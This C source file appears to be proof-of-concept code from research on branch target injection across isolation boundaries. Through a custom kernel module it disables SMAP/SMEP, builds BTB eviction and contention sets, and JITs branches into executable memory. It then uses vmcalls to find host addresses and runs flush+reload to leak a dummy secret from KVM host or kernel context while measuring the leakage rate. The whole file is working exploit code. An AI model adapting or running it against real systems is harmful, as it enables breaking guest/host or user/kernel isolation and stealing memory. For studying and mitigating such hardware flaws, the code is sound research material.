#include <sys/mman.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sched.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <time.h>
#include <string.h>
#include <assert.h>
#include <malloc.h>
#include <sys/syscall.h>

#include "lib.h"
#include "common.h"
#include "flush_and_reload.h"
#include "jitting.h"
#include "targets.h"
#include "helper.h"
#include "mitigations.h"
#include "config.h"
#include "leakage_rate.h"
#include "../../../common/kmmap/mm.h"

#define PATH_DISABLE_SMAP_SMEP "/proc/execute_caller_vm/disable_smap_smep"
#define PATH_KERNEL_EXECUTE "/proc/execute_caller_vm/do_execute"
#define PATH_DO_VMCALL "/proc/execute_caller_vm/do_vmcall"
#define PATH_LEAK_PAGE "/proc/execute_caller_vm/leak_page"

void disable_smap_smep() {

    int fd;
    char buf[8];
    uint8_t * address;

    if (access(PATH_DISABLE_SMAP_SMEP, F_OK) == 0) {
        fd = open(PATH_DISABLE_SMAP_SMEP, O_RDONLY);
        assert(fd);
    } else {
        printf("Error: File %s not found. Please insert the kernel module\n", PATH_DISABLE_SMAP_SMEP);
        exit(EXIT_FAILURE);
    }

    assert(read(fd, buf, 8) == 3);

    close(fd);

}


uint8_t * get_host_address(config * cfg, uint8_t * user_address) {

    char buf[17];
    void * args[4];
    int ret;
    uint64_t sid;
    uint8_t * host_address;

    sid = (get_45bit_random_value() << 19) + get_45bit_random_value();

    *(uint64_t *) user_address = sid;

    host_address = (uint8_t *) do_vmcall(cfg->fd_vmcall, OPTION_GET_HOST_ADDRESS, *(uint64_t *) user_address, 0);

    if (host_address == 0) {
        printf("Failed finding host address for %p!\n", user_address);
        exit(EXIT_FAILURE);
    }

    *(uint64_t *) user_address = 0;

    return host_address;

}

void initialize_eviction_set(config * cfg) {

    int idx = 0;

#if 1
    // Victim's BTB entry eviction:
    // For some configs (depending on the entry offset / PC[5:0]) we dont
    // need a eviction set, we enable it on default.

    if (cfg->train_in_kernel == 0 || cfg->test_in_kernel == 2) {

        // PC Eviction via an eviction set
        for (int i = 0; i < BTB_EVICTION_SET_SIZE; i++)
        {
            cfg->caller_evict_list_pc[idx] = (void *) (0x300000000000 + ((get_45bit_random_value() % (1LU << (24))) << (SET_END + 1)));
            cfg->caller_evict_list_pc[idx] = (void *) ((uint64_t) cfg->caller_evict_list_pc[idx] + (((uint64_t) cfg->caller1  + CALLER_PATCH_END_OFFSET) & (SET_MASK)));
            cfg->caller_evict_list_pc[idx] -= CALLER_PATCH_END_OFFSET;

            printf("%15s: %p (tag: 0x%03x, set: 0x%03x, PC[5:0]: 0x%03x)\n", "Eviction Set", cfg->caller_evict_list_pc[idx] + CALLER_PATCH_END_OFFSET,
                get_tag_for_address(cfg->caller_evict_list_pc[idx]  + CALLER_PATCH_END_OFFSET),
                get_set_for_address(cfg->caller_evict_list_pc[idx]  + CALLER_PATCH_END_OFFSET),
                get_offset_for_address(cfg->caller_evict_list_pc[idx]  + CALLER_PATCH_END_OFFSET));

            idx++;

        }

    } else {

        // for kernel - kernel we can use a full alias branch
        // in user space to evict the victim's BTB entry
        // PC FULL ALIAS
        cfg->caller_evict_list_pc[idx] = (void *) (0x300000000000 + (((uint64_t) cfg->caller1 + CALLER_PATCH_END_OFFSET) & (TAG_SET_MASK | 0x3f))) ;
        cfg->caller_evict_list_pc[idx] -= CALLER_PATCH_END_OFFSET;

        printf("%15s: %p (tag: 0x%03x, set: 0x%03x, PC[5:0]: 0x%03x)\n", "Eviction Set", cfg->caller_evict_list_pc[idx] + CALLER_PATCH_END_OFFSET,
            get_tag_for_address(cfg->caller_evict_list_pc[idx]  + CALLER_PATCH_END_OFFSET),
            get_set_for_address(cfg->caller_evict_list_pc[idx]  + CALLER_PATCH_END_OFFSET),
            get_offset_for_address(cfg->caller_evict_list_pc[idx]  + CALLER_PATCH_END_OFFSET));

        idx++;
    }

#endif

    if (cfg->test_in_kernel == 2) {
        // In the VMM scenario, as only short targets break isolation,
        // we force to inject a short BTB target by creating contention on the
        // same set with near (32-bit) BTB entries.

        for (int i = 0; i < BTB_CONTENTION_SET_SIZE; i++)
        {
            // PC Eviction
            cfg->caller_evict_list_pc[idx] = (void *) (0x300000000000 + ((get_45bit_random_value() % (1LU << (24))) << (SET_END + 1)));
            cfg->caller_evict_list_pc[idx] = (void *) ((uint64_t) cfg->caller_evict_list_pc[idx] + (((uint64_t) cfg->caller0  + CALLER_PATCH_END_OFFSET) & (SET_MASK)));
            cfg->caller_evict_list_pc[idx] -= CALLER_PATCH_END_OFFSET;

            printf("%15s: %p (tag: 0x%03x, set: 0x%03x, PC[5:0]: 0x%03x)\n", "Contention Set", cfg->caller_evict_list_pc[idx] + CALLER_PATCH_END_OFFSET,
                get_tag_for_address(cfg->caller_evict_list_pc[idx]  + CALLER_PATCH_END_OFFSET),
                get_set_for_address(cfg->caller_evict_list_pc[idx]  + CALLER_PATCH_END_OFFSET),
                get_offset_for_address(cfg->caller_evict_list_pc[idx]  + CALLER_PATCH_END_OFFSET));

            idx++;

        }
    }


}



static int test_current_config(config * cfg) {

    uint64_t hits[N_FR_BUF] = {};

    for (size_t inner = 0; inner < 1; inner++)
    {

        do_flush_and_reload(cfg, hits, BRUTE_FORCE_ITERATIONS);

        if(
            hits[0] > 0 ||
            hits[1] > 0 ||
            hits[2] > 0
            ) {


            print_hits_header();
            print_hits(hits, "INITIAL", BRUTE_FORCE_ITERATIONS);


            for (size_t i = 0; i < 5; i++)
            {
                do_flush_and_reload(cfg, hits, MANY_ITERATIONS * 10);
                print_hits(hits, "VERIFY", MANY_ITERATIONS * 10);
            }

            fflush(stdout);

            return 1;

        }

    }
    return 0;

}

static int do_single_test(config * cfg) {

    uint64_t outer = 0;

    randomize_history(cfg, 0);
    randomize_history(cfg, 1);

    // equal history
    // for(int i=0; i<MAX_HISTORY_SIZE; i++) cfg->history_1[i] = cfg->history_0[i];

    // different history
    // for(int i=0; i<MAX_HISTORY_SIZE; i++) cfg->history_1[i] = -cfg->history_0[i];


    /// ------------
    if (cfg->kvm_victim_indirect_branch_pc) {
        cfg->caller0 = (void *) 0xffffd00000000000 + ((uint64_t) cfg->kvm_victim_indirect_branch_pc & ((1LU << 45) - 1)) - CALLER_PATCH_END_OFFSET;
        cfg->caller0 = (void *) ((uint64_t) (cfg->caller0 + CALLER_PATCH_END_OFFSET) & ~((1LU << 6) - 1)) - CALLER_PATCH_END_OFFSET + 0x20;

        cfg->caller1 = (void *) 0xffff800000000000 + ((uint64_t) cfg->kvm_victim_indirect_branch_pc & ((1LU << 44) - 1)) - CALLER_PATCH_END_OFFSET;

    } else {

        cfg->caller0 = get_random_address(cfg->base0);
        // mask with 8, to prevent target address bit > 10 will be different
        cfg->caller0 = (void *) (((uint64_t) cfg->caller0 + CALLER_PATCH_END_OFFSET) & ~((1LU << 8) - 1));
        cfg->caller0 += 0x20 + (rand() % 0x20); // Upper half of the cache line
        cfg->caller0 -= CALLER_PATCH_END_OFFSET;

        cfg->caller1 = (void *) (cfg->base1 + ((uint64_t) cfg->caller0 & (TAG_SET_MASK)));
        cfg->caller1 = (void *) (((uint64_t) cfg->caller1 + CALLER_PATCH_END_OFFSET) & ~((1LU << 6) - 1));
        cfg->caller1 += (rand() % 0x20); // Lower half of the cache line
        cfg->caller1 -= CALLER_PATCH_END_OFFSET;

        // static
        // cfg->caller0 = (void *) 0x500a0132d4b0 - CALLER_PATCH_END_OFFSET;
        // cfg->caller1 = (void *) 0x60020132d489 - CALLER_PATCH_END_OFFSET;

    }


    // We flip some bits such that we can distinguish between the
    // short and near target
#if defined(INTEL_10_GEN) || defined(INTEL_9_GEN)
    cfg->caller1 = (void *) ((uint64_t) cfg->caller1 ^ ((1 << 16) | (1 << 24)));
#elif defined(INTEL_11_GEN)
    cfg->caller1 = (void *) ((uint64_t) cfg->caller1 ^ ((1 << 16) | (1 << 26)));
#endif


    initialize_eviction_set(cfg);

    jit_callers(cfg);
    insert_targets_at_free_addresses(cfg, TARGET0_OFFSET);

    uint8_t * translated_target = (void *) ((uint64_t) cfg->kvm_speculation_target_pc & ((1LU << 45) - 1));

    if ((uint64_t) translated_target & ~(1LU << 32) != (uint64_t) cfg->target0  & ~(1LU << 32) ) {
        printf("ERROR: Mismatching target aliasing!\n");
        printf("speculation target: %p!\n", cfg->kvm_speculation_target_pc);
        printf("TARGET0           : %p!\n", cfg->target0);
        exit(0);
    }

    print_config(cfg);


    while (1)
    {

        outer++;
        if(test_current_config(cfg)) {
            printf("Total iterations: %lu\n", outer);
            return 0;
        }

        if(outer % (100 * 100) == 0) {
            printf("\rIteration: %lu ", outer);
            fflush(stdout);
        }

        if (outer > 500 * 100) {
            printf("No signal... exiting\n");
            exit(0);
        }

    }

    clean_all(cfg);

    return 0;
}

static int init(config * cfg) {
    uint64_t seed;

    seed = time(0);
    srand(seed);
    printf("Seed: %lu\n", seed);

    assert(syscall(SYS_getcpu, &cfg->cpu_nr, NULL, NULL) == 0);
    printf("Running on CPU: %d\n", cfg->cpu_nr);

    disable_smap_smep();

    initialize_memory_controller();

    // Initialize global settings
    initialize_config(cfg);


    cfg->ind_map = (uint8_t *) allocate_huge_page();

    cfg->base0 =(uint8_t *) 0x500000000000LLU;
    cfg->base1 =(uint8_t *) 0x600000000000LLU;

    cfg->ftable1 = (void **) malloc(0x2000);
    cfg->history_0 = calloc(sizeof(uint64_t), MAX_HISTORY_SIZE);
    cfg->history_1 = calloc(sizeof(uint64_t), MAX_HISTORY_SIZE);


    for (unsigned i = 0; i < N_FR_BUF; i++)
    {
        cfg->fr_buf[i] = cfg->ind_map + (0x1000 * (i + 1));
        memset(cfg->fr_buf[i], 0x94, 0x1000);
        *(((uint8_t **)cfg->fr_buf_p) + i) = (uint8_t *) cfg->fr_buf[i] - FR_BUF_SID;
    }

    cfg->secret_page = cfg->ind_map + 0x10000;
    memset(cfg->secret_page, 0x0, 0x1000);

    // ------------------------------------------------------------------------
    // JIT history

    cfg->history_jit_0 = calloc(sizeof(uint64_t), HISTORY_JMP_SIZE);
    cfg->history_jit_1 = calloc(sizeof(uint64_t), HISTORY_JMP_SIZE);

    cfg->history_jit_rwx_0 = mmap((void *) 0x200000000000, HISTORY_RWX_SIZE, PROT_WRITE|PROT_READ|PROT_EXEC,
				MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE|MAP_FIXED, -1, 0);
    assert(cfg->history_jit_rwx_0 != MAP_FAILED);

    cfg->history_jit_rwx_1 = mmap((void *) 0x300000000000, HISTORY_RWX_SIZE, PROT_WRITE|PROT_READ|PROT_EXEC,
				MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE|MAP_FIXED, -1, 0);
    assert(cfg->history_jit_rwx_1 != MAP_FAILED);



    // ------------------------------------------------------------------------

    if (access(PATH_KERNEL_EXECUTE, F_OK) == 0) {
        cfg->fd_kernel_exec = open(PATH_KERNEL_EXECUTE, O_WRONLY);
        assert(cfg->fd_kernel_exec);
    } else {
        printf("Error: File %s not found. Please insert the kernel module\n", PATH_KERNEL_EXECUTE);
        exit(EXIT_FAILURE);
    }


    if (cfg->test_in_kernel == 2) {

        if (access(PATH_DO_VMCALL, F_OK) == 0) {
            cfg->fd_vmcall = open(PATH_DO_VMCALL, O_RDONLY);
            assert(cfg->fd_vmcall);
        } else {
            printf("Error: File %s not found. Please insert the kernel module\n", PATH_DO_VMCALL);
            exit(EXIT_FAILURE);
        }

        if (access(PATH_LEAK_PAGE, F_OK) == 0) {
            cfg->fd_leak_page = open(PATH_LEAK_PAGE, O_WRONLY);
            assert(cfg->fd_leak_page);
        } else {
            printf("Error: File %s not found. Please insert the kernel module\n", PATH_LEAK_PAGE);
            exit(EXIT_FAILURE);
        }

        cfg->kvm_victim_indirect_branch_pc = (uint8_t *) do_vmcall(cfg->fd_vmcall, OPTION_GET_VICTIM_ADDRESS, 0, 0);
        cfg->kvm_speculation_target_pc = (uint8_t *) do_vmcall(cfg->fd_vmcall, OPTION_GET_SPECULATION_TARGET_ADDRESS, 0, 0);


        cfg->host_fr_buf = get_host_address(cfg, cfg->fr_buf[0]);
        cfg->host_secret_page = get_host_address(cfg, cfg->secret_page);

        cfg->host_arg_fr_buf = cfg->host_fr_buf;
        cfg->host_arg_secret = cfg->host_secret_page;

    }


    print_global_settings(cfg);

    // ------------------------------------------------------------------------


    return 0;

}


int main(int argc, char **argv)
{
    assert(TAG_PART_1_END - TAG_PART_1_START == TAG_PART_2_END - TAG_PART_2_START);

    struct config cfg = {0};

    print_mitigation_info();


    if (init(&cfg)) {
        return 1;
    }

    do_single_test(&cfg);

    if (cfg.test_in_kernel == 2) {

        leak_dummy_secret(&cfg);

        if (cfg.train_in_kernel == 0) {
            leak_test_leakage_rate(&cfg);
        } else {
            test_kernel_leakage_rate(&cfg);
        }
    }

}
